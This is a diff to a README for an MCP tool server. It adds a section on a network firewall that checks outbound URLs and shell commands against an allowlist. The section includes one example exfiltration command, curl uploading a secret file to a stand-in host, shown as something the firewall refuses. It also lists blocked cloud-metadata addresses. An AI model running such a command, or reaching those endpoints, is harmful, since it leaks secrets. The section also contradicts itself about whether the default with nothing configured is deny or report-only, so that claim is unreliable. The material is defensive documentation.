@@ -142,6 +142,63 @@ while you are chatting, if you want to see the list of questions and answer from
 
 /edit - this will start a editor to type multi line message.
 
+## Network firewall
+
+mcp-srv has a network policy in `mcp-srv/network-firewall.go`. It answers one question
+for every outbound call: *is this target on the list I allow?* and logs the answer.
+
+What it covers:
+- `fetch_url` and `http_request` in `base-tool.go` — the URL argument is checked before the request.
+- Every `http.Client` in the server (rustdoc, confluence, octo download) rides
+  `FirewallTransport`, so the check happens at dial time — a redirect to an off-list
+  host is refused before a socket opens, and a URL built inside library code is still
+  caught. `file://`/`gopher://` are refused, proxies are not followed.
+- `exec_command` / `run_terminal_command` — the line is parsed for URL and host
+  targets (curl/wget/git remote/npm registry/pip index/ssh host/scp path/rsync/uv
+  ...). A target that is not allowlisted denies the command, so a permitted program
+  cannot be used to exfiltrate: `curl -T ./secret http://evil` is refused,
+  `curl -s https://allowlisted/api` runs.
+- Playwright `browser_*` tools are NOT proxied (they are a separate upstream server);
+  see the note in `playwright-proxy.go`.
+
+Config (environment, same `u.Getenv` precedence as the other tool settings):
+- **Set nothing = DENY BY DEFAULT with the built-in allowlist** (~55 documentation,
+  package-registry and source-hosting domains). There is no "unset means wide open"
+  state. The effective policy is printed at startup, so you can see what is allowed
+  without reading source.
+- `ALLOWED_URL_PTN` — REPLACES the built-in list with your own anchored Go regex
+  (matched against the raw target AND the normalized URL: scheme lowercased, default
+  port explicit, no `#fragment`). Unanchored patterns get a startup warning.
+- `ALLOWED_URL_ADD` — extends the built-in list instead of replacing it. Comma or
+  semicolon separated: a bare host (`api.openai.com`, or `localhost:8000` to pin
+  a port) becomes `^https?://host(:port)?(?:/.*)?$`; a value starting with `^` is
+  used as a raw regex
+  (`^https://cdn\.corp\.internal/(?:docs|api)/`).
+- `ALLOWED_URL_OPEN=1` — the explicit opt out: report-only mode, every target logged
+  as `would-deny` but nothing blocked. Logged loudly, because it is the one config
+  where the agent can dial an arbitrary host. (`ALLOWED_URL_STRICT` is now obsolete;
+  it prints a one-line notice.)
+- `BLOCKED_URL_PTN` — deny wins over allow.
+- `ALLOWED_URL_LOOPBACK=0` — refuse 127.0.0.1/localhost/.internal hosts.
+- `ALLOWED_URL_RESOLVE=1` — resolve hostnames and refuse a CNAME pointing at a
+  loopback or link-local address (DNS rebinding).
+- `OCTO_URL` / `CONFLUENCE_BASE_URL` — their HOST is imported into the allowlist
+  automatically, since you configured those tools yourself (host only; the path is
+  dropped so it cannot become a wildcard).
+
+Always denied regardless of allowlist: cloud metadata (`169.254.169.254`,
+`metadata.google.internal`, `169.254.%`), link-local `169.254.0.0/16`,
+`fe80::/10`, and `file://` to local paths. A single-label host (`localhost`,
+`internal`) cannot be checked against an allowlist and is refused.
+
+No `ALLOWED_URL_PTN` set = report-only: the decision is logged as
+`|NET|would-deny|` and the call still goes through, so an existing setup is not broken
+by default. Audit trail (stderr, one line per URL, greppable):
+
+    <UTC>|<model>|<session>|NET|allowed|https://…/x|
+    <UTC>|<model>|<session>|NET|denied|https://…/y|not in the network allowlist …
+
+grep the server log for `|NET|` to see every target the agent tried.
 ## What next
 
 You can read the code and make new mcp tools for your goal or do anything with it. Code is pure go, reflecting the JsonRPC 2 protocol.
